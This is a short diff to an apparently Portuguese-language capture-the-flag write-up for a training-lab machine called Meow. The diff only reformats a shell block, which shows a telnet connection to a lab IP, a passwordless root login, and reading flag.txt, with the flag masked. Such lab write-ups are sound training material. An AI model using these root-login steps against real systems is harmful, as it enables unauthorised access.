@@ -31,9 +31,9 @@
 ## **Envie a flag**
 _write-up_:
 ~~~shell
-# telnet 10.129.33.211 23
-# Meow login: root
-# ls
-# cat flag.txt
-# HTB{∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎}
+ telnet 10.129.33.211 23
+ Meow login: root
+ ls
+ cat flag.txt
+ HTB{∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎}
 ~~~
